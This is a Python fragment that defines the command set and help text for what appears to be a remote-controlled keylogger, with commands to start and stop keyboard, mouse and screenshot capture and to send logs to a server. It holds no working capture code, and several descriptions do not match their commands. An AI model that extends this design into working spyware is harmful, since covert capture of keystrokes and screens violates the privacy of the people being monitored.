TASKS = [
        "PAUSE_SERVER",#
        "STOP_SERVER",#
        "STOP_CAPTURE_KEYBOARD",#
        "STOP_CAPTURE_MOUSE",#
        "STOP_CAPTURE_PICTURE",#
        "RESTART_SERVER",#
        "STOP_LOG_KEYBOARD",#
        "STOP_LOG_MOUSE",#
        "STOP_LOG_PICTURE",#
        "START_LOG_KEYBOARD",#
        "START_LOG_MOUSE",#
        "START_LOG_PICTURE",#
        "STATUS_SERVER",#
        "STATUS_LOG",#
        "LISTEN",#
        "KILL",#
        "LOG_TIMER",#
        "DELETE_LOG",#
        "MOVE",#
        "PING",
        "PICTURE_MODE",
        "SEND_LOG",
        "HELP"
    ]

TASKS_DESCRIPTION = [
    "Server will be paused",
    "Server will be stopped",
    "Keyboard capture will be stopped",
    "Mouse capture will be stopped",
    "Picture capture will be stopped",
    "Server will be restarted",
    "Keyboard log will be stopped",
    "Mouse log will be stopped",
    "Picture log will be stopped",
    "Keyboard log will be started",
    "Mouse log will be started",
    "Picture log will be started",
    "Server status",
    "Log status",
    "Reset configuration",
    "Kill client",
    "Add log timer",
    "Delete log",
    "Move the client",
    "Ping the server",
    "send log",
    "Change picture mode [timer => Number in secondes or click => Number of click recommanded 50]",
    """
    SEND_LOG :          Server will be paused
    PAUSE_SERVER :          Server will be paused
    STOP_SERVER :           Server will be stopped
    STOP_CAPTURE_KEYBOARD : Keyboard capture will be stopped
    STOP_CAPTURE_MOUSE :    Mouse capture will be stopped
    STOP_CAPTURE_PICTURE :  Picture capture will be stopped
    RESTART_SERVER :        Server will be restarted
    STOP_LOG_KEYBOARD :     Keyboard log will be stopped
    STOP_LOG_MOUSE :        Mouse log will be stopped
    STOP_LOG_PICTURE :      Picture log will be stopped
    START_LOG_KEYBOARD :    Keyboard log will be started
    START_LOG_MOUSE :       Mouse log will be started
    START_LOG_PICTURE :     Picture log will be started
    STATUS_SERVER :         Server status
    STATUS_LOG :            Log status
    RESET_CONFIG :          Reset configuration
    KILL :                  Kill client
    LOG_TIMER :             Add log timer
    DELETE_LOG :            Delete log
    MOVE :                  Move the client on random path (not implemented)
    PING :                  Ping the server
    PICTURE_MODE :          Change picture mode [timer => Number in secondes or click => Number of click recommanded 50]
    SEND_LOG :              Send log to server (api)=> auto send to client
    """
]